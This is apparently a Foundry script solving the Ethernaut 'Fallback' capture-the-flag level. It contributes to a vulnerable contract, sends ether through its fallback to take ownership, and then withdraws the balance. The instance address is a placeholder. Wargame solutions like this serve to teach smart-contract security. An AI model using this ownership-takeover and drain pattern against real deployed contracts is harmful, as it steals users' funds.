pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract script_Fallback is Script
{
    function run() external
    {
        vm.startBroadcast();

        address payable instance = payable(/* instance address*/);
        Fallback fallbackC = Fallback(instance);

        fallbackC.contribute{value: 0.000000001 ether}();
        instance.call{value: 0.000000001 ether}("");
        fallbackC.withdraw();

        vm.stopBroadcast();
    }
}
